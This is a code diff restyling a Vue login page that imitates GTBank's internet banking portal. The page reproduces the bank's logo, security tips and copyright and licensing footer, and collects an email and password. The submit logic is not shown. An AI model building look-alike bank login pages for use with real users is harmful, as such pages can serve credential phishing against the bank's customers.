@@ -1,100 +1,134 @@
 <template>
-    
-    <div class="auth-container">
-        <div class="right-section">
-        <div class="logo-container">
-        <img src="@/assets/gtco.svg" alt="GTCO Logo" class="gtco-logo">
+  <div class="min-h-screen bg-gradient-to-br from-gray-50 to-orange-50 py-8 px-4 sm:px-6 lg:px-8">
+    <div class="max-w-4xl mx-auto">
+      <!-- Logo Container -->
+      <div class="flex justify-end mb-6">
+        <img src="@/assets/gtco.svg" alt="GTCO Logo" class="w-32 h-auto transform hover:scale-105 transition-transform duration-300" />
       </div>
-      <div class="login-content">
-        <div class="header">
-          <h2>INTERNET BANKING</h2>
-        </div>
-        
-        <div class="login-card">
-          <p class="welcome-text">WELCOME BACK!</p>
-          <p class="login-instruction">Kindly login with any of UserID, Account Number, Phone Number or Email</p>
-          
-          <form @submit.prevent="handleSubmit">
-            <div v-if="loginError" class="error-message alert">
-                {{ loginError }}
-            </div>
-            <div class="form-group">
-              <input 
-                type="email" 
-                v-model="userId" 
-                placeholder="Enter your email"
-                ref="userIdInput"
-                @focus="handleFocus('userId')"
-                @input="validateEmail"
-                :class="{ 'error': emailError }"
-              >
-              <small class="error-message" v-if="emailError">{{ emailError }}</small>
-            </div>
-            <div class="form-group password-group">
-              <input 
-                :type="showPassword ? 'text' : 'password'" 
-                v-model="password" 
-                placeholder="Password"
-                ref="passwordInput"
-                @focus="handleFocus('password')"
-                :class="{ 'active': activeInput === 'password' }"
-              >
-              <span class="password-toggle" @click="togglePassword">
-                👁️
-              </span>
+
+      <div class="bg-gray-300 p-2 mb-4">
+        <h2 class="text-2xl font-bold text-black">INTERNET BANKING</h2>
+      </div>
+      <!-- Main Content -->
+      <div class="bg-white rounded-2xl shadow-2xl overflow-hidden">
+        <!-- Header -->
+
+        <!-- Login Form -->
+        <div class="p-8">
+          <form @submit.prevent="handleSubmit" class="space-y-6">
+            <!-- Error Message -->
+            <div v-if="loginError" class="bg-red-100 border-l-4 border-red-500 text-red-700 p-4 rounded-lg">
+              <p class="font-medium">{{ loginError }}</p>
             </div>
 
-            <!-- Number pad -->
-            <div class="number-pad">
-              <div class="number-row">
-                <button type="button" class="num-btn" @click="appendNumber('9')">9</button>
-                <button type="button" class="num-btn" @click="appendNumber('8')">8</button>
-                <button type="button" class="num-btn" @click="appendNumber('6')">6</button>
-                <button type="button" class="clr-btn" @click="clearInput">CLR</button>
-              </div>
-              <div class="number-row">
-                <button type="button" class="num-btn" @click="appendNumber('7')">7</button>
-                <button type="button" class="num-btn" @click="appendNumber('4')">4</button>
-                <button type="button" class="num-btn" @click="appendNumber('1')">1</button>
-                <button type="button" class="del-btn" @click="deleteLastChar">DEL</button>
-              </div>
-              <div class="number-row">
-                <button type="button" class="num-btn" @click="appendNumber('3')">3</button>
-                <button type="button" class="num-btn" @click="appendNumber('5')">5</button>
-                <button type="button" class="num-btn" @click="appendNumber('2')">2</button>
-                <button type="button" class="login-btn" @click="handleSubmit">LOGIN</button>
+            <!-- Email Input -->
+            <div>
+              <label class="block text-sm font-medium text-gray-700 mb-1">Email Address</label>
+              <div class="relative">
+                <input 
+                  type="email" 
+                  v-model="userId" 
+                  ref="userIdInput"
+                  @focus="handleFocus('userId')"
+                  @input="validateEmail"
+                  class="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-orange-500 focus:border-orange-500 transition-colors"
+                  :class="{ 'border-red-500': emailError }"
+                  placeholder="Enter your email address"
+                />
+                <div v-if="emailError" class="text-red-500 text-sm mt-1">{{ emailError }}</div>
               </div>
             </div>
 
-            <div class="form-footer">
-              <label class="remember-me">
-                <input type="checkbox" v-model="rememberMe">
-                Remember my UserID
+            <!-- Password Input -->
+            <div>
+              <label class="block text-sm font-medium text-gray-700 mb-1">Password</label>
+              <div class="relative">
+                <input 
+                  :type="showPassword ? 'text' : 'password'" 
+                  v-model="password" 
+                  ref="passwordInput"
+                  @focus="handleFocus('password')"
+                  class="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-orange-500 focus:border-orange-500 transition-colors"
+                  placeholder="Enter your password"
+                />
+                <button 
+                  type="button"
+                  @click="togglePassword"
+                  class="absolute right-3 top-1/2 -translate-y-1/2 text-gray-500 hover:text-gray-700 transition-colors"
+                >
+                  <span v-if="showPassword">🔒</span>
+                  <span v-else>👁️</span>
+                </button>
+              </div>
+            </div>
+
+            <!-- Number Pad -->
+            <div class="grid grid-cols-4 gap-2 max-w-xs mx-auto mt-6">
+              <button type="button" v-for="n in 9" :key="n" 
+                @click="appendNumber(n.toString())"
+                class="w-12 h-12 rounded-lg bg-gray-100 hover:bg-gray-200 text-gray-800 font-medium transition-colors"
+              >
+                {{ n }}
+              </button>
+              <button type="button" @click="clearInput" class="w-12 h-12 rounded-lg bg-orange-100 hover:bg-orange-200 text-orange-600 font-medium transition-colors">
+                CLR
+              </button>
+              <button type="button" @click="appendNumber('0')" class="w-12 h-12 rounded-lg bg-gray-100 hover:bg-gray-200 text-gray-800 font-medium transition-colors">
+                0
+              </button>
+              <button type="button" @click="deleteLastChar" class="w-12 h-12 rounded-lg bg-gray-700 hover:bg-gray-800 text-white font-medium transition-colors">
+                ⌫
+              </button>
+              <button type="submit" class="w-12 h-12 rounded-lg bg-green-600 hover:bg-green-700 text-white font-medium transition-colors">
+                →
+              </button>
+            </div>
+
+            <!-- Remember Me & Forgot Password -->
+            <div class="flex items-center justify-between mt-6">
+              <label class="flex items-center">
+                <input type="checkbox" v-model="rememberMe" class="w-4 h-4 text-orange-600 border-gray-300 rounded focus:ring-orange-500">
+                <span class="ml-2 text-sm text-gray-600">Remember me</span>
               </label>
-              <a href="#" class="forgot-link">Forgot Login Credentials?</a>
+              <a href="#" class="text-sm text-orange-600 hover:text-orange-700 font-medium">Forgot Password?</a>
             </div>
-            
-            <button type="submit" class="register-btn">CLICK TO REGISTER</button>
+
+            <!-- Register Button -->
+            <button type="button" class="w-full py-3 px-4 bg-gradient-to-r from-orange-500 to-orange-600 text-white font-medium rounded-lg hover:from-orange-600 hover:to-orange-700 focus:outline-none focus:ring-2 focus:ring-orange-500 focus:ring-offset-2 transform transition-all hover:scale-[1.02]">
+              CREATE NEW ACCOUNT
+            </button>
           </form>
         </div>
+      </div>
 
-        <!-- Info Cards -->
-        <div class="info-cards">
-          <div class="info-card">
-            <h3>Security Tips</h3>
-            <p>Please note that GTBank will NEVER ask you to provide your PIN (Personal Identification Numbers)</p>
-            <button>READ MORE</button>
+      <!-- Info Cards -->
+      <div class="grid grid-cols-1 md:grid-cols-3 gap-6 mt-8">
+        <div v-for="(card, index) in infoCards" :key="index" 
+          class="bg-white rounded-xl p-6 shadow-lg hover:shadow-xl transition-all duration-300 transform hover:-translate-y-1 flex flex-col h-full"
+        >
+          <div class="flex-1">
+            <div class="flex items-center gap-4 mb-4">
+              <div class="w-12 h-12 rounded-full bg-orange-100 flex items-center justify-center">
+                <span class="text-2xl">{{ card.icon }}</span>
+              </div>
+              <h3 class="text-lg font-semibold text-gray-800">{{ card.title }}</h3>
+            </div>
+            <p class="text-gray-600 mb-4">{{ card.description }}</p>
           </div>
-          <div class="info-card">
-            <h3>Do you have a token?</h3>
-            <p>Get a Token today and begin to carry out third party transfers and online payments.</p>
-            <button>GET YOURS</button>
-          </div>
-          <div class="info-card">
-            <h3>Account Transfers (Instant)</h3>
-            <p>The fastest way to transfer money to other bank accounts</p>
-            <button>TRY IT TODAY</button>
-          </div>
+          <button class="w-full py-2 px-4 bg-gray-800 text-white rounded-lg hover:bg-gray-900 transition-colors text-sm font-medium mt-auto">
+            {{ card.buttonText }}
+          </button>
+        </div>
+      </div>
+
+      <!-- Footer -->
+      <div class="mt-8 bg-orange-600 text-white text-center py-3 px-4 text-sm rounded-lg">
+        © 2025 Guaranty Trust Bank Limited. RC 152321 (Licensed by the Central Bank of Nigeria). 
+        <div class="flex justify-center gap-4 mt-1">
+          <a href="https://www.gtbank.com" class="hover:underline">GTBANK.COM</a> |
+          <a href="#" class="hover:underline">PRIVACY POLICY</a> |
+          <a href="#" class="hover:underline">TERMS & CONDITIONS</a> |
+          <a href="#" class="hover:underline">WHISTLE BLOWER</a>
         </div>
       </div>
     </div>
@@ -117,6 +151,27 @@ const activeInput = ref(null);
 
 const userIdInput = ref(null);
 const passwordInput = ref(null);
+
+const infoCards = [
+  {
+    icon: '🔒',
+    title: 'Security Tips',
+    description: 'Please note that GTBank will NEVER ask you to provide your PIN (Personal Identification Numbers)',
+    buttonText: 'READ MORE'
+  },
+  {
+    icon: '🔑',
+    title: 'Do you have a token?',
+    description: 'Get a Token today and begin to carry out third party transfers and online payments.',
+    buttonText: 'GET YOURS'
+  },
+  {
+    icon: '💸',
+    title: 'Account Transfers (Instant)',
+    description: 'The fastest way to transfer money to other bank accounts',
+    buttonText: 'TRY IT TODAY'
+  }
+];
 
 const handleSubmit = async () => {
     try {
@@ -191,223 +246,23 @@ const handleFocus = (inputType) => {
 </script>
 
 <style scoped>
-.auth-container {
-  /* display: flex; */
-  min-height: 100vh;
-}
-.logo-container {
-    display: flex;
-    justify-content: flex-end;
-    margin-bottom: 1rem;
-    padding-right: 20px;
-}
-
-.gtco-logo {
-  width: 100px;
-  height: auto;
-}
-/* .left-section {
-  flex: 1;
-  background: linear-gradient(135deg, #ff6b35 0%, #ff8c42 100%);
-  clip-path: polygon(0 0, 100% 0, 85% 100%, 0 100%);
-} */
-
-.right-section {
-  padding: 2rem;
-  /* background-color: #f5f5f5; */
-}
-
-.login-content {
-  max-width: 1200px;
-  margin: 0 auto;
-}
-
-.header {
-  margin-bottom: 2rem;
-   background-color: #f5f5f5;
-}
-
-.header h2 {
-  color: #333;
-  font-weight: 500;
-}
-
-.login-card {
-  background: white;
-  padding: 2rem;
-  border-radius: 8px;
-  box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
-  margin-bottom: 2rem;
-}
-
-.welcome-text {
-  color: #ff6b35;
-  font-weight: bold;
-  margin-bottom: 0.5rem;
-}
-
-.login-instruction {
-  color: #666;
-  margin-bottom: 1.5rem;
-}
-
-.form-group {
-  margin-bottom: 1rem;
-  position: relative;
-}
-
-input {
-  width: 100%;
-  padding: 0.75rem;
-  border: 1px solid #ddd;
-  border-radius: 4px;
-  font-size: 1rem;
-}
-
-.password-group {
-  position: relative;
-}
-
-.password-toggle {
-  position: absolute;
-  right: 1rem;
-  top: 50%;
-  transform: translateY(-50%);
-  cursor: pointer;
-}
-
-.number-pad {
-  margin: 1rem 0;
-}
-
-.number-row {
-  display: flex;
-  justify-content: center;
-  gap: 0.5rem;
-  margin-bottom: 0.5rem;
-}
-
-.num-btn, .clr-btn, .del-btn, .login-btn {
-  width: 60px;
-  height: 40px;
-  border: 1px solid #ddd;
-  border-radius: 4px;
-  background: white;
-  cursor: pointer;
-}
-
-.clr-btn {
-  background: #ff6b35;
-  color: white;
-}
-
-.del-btn {
-  background: #666;
-  color: white;
-}
-
-.login-btn {
-  background: #4CAF50;
-  color: white;
-}
-
-.form-footer {
-  display: flex;
-  justify-content: space-between;
-  align-items: center;
-  margin: 1rem 0;
-}
-
-.register-btn {
-  width: 100%;
-  padding: 0.75rem;
-  background: #ff6b35;
-  color: white;
-  border: none;
-  border-radius: 4px;
-  cursor: pointer;
-  font-weight: bold;
-}
-
-.info-cards {
-  display: grid;
-  grid-template-columns: repeat(3, 1fr);
-  gap: 1rem;
-  margin-top: 2rem;
-}
-
-.info-card {
-  background: white;
-  padding: 1.5rem;
-  border-radius: 8px;
-  box-shadow: 0 2px 6px rgba(0, 0, 0, 0.1);
-}
-
-.info-card h3 {
-  color: #333;
-  margin-bottom: 1rem;
-}
-
-.info-card p {
-  color: #666;
-  margin-bottom: 1rem;
-}
-
-.info-card button {
-  background: #666;
-  color: white;
-  border: none;
-  padding: 0.5rem 1rem;
-  border-radius: 4px;
-  cursor: pointer;
-}
-.error-message.alert {
-    background-color: #ff4444;
-    color: white;
-    padding: 10px;
-    border-radius: 4px;
-    margin-bottom: 1rem;
-}
-
-@media (max-width: 1024px) {
-  .auth-container {
-    flex-direction: column;
-  }
-  
-  .left-section {
-    height: 200px;
-  }
-  
-  .info-cards {
-    grid-template-columns: 1fr;
-  }
-}
-
+/* Remove all existing styles and keep only these animation-related ones */
 .num-btn:active, .clr-btn:active, .del-btn:active, .login-btn:active {
   transform: scale(0.95);
 }
 
-.active-input {
-  border: 2px solid #ff6b35;
+@keyframes fadeIn {
+  from {
+    opacity: 0;
+    transform: translateY(10px);
+  }
+  to {
+    opacity: 1;
+    transform: translateY(0);
+  }
 }
 
-.error {
-  border-color: #ff0000 !important;
+.fade-in {
+  animation: fadeIn 0.5s ease-out forwards;
 }
-
-.error-message {
-  color: #ff0000;
-  font-size: 0.8rem;
-  margin-top: 0.25rem;
-  display: block;
-}
-
-input[type="email"] {
-  width: 100%;
-  padding: 0.75rem;
-  border: 1px solid #ddd;
-  border-radius: 4px;
-  font-size: 1rem;
-}
-
 </style> 
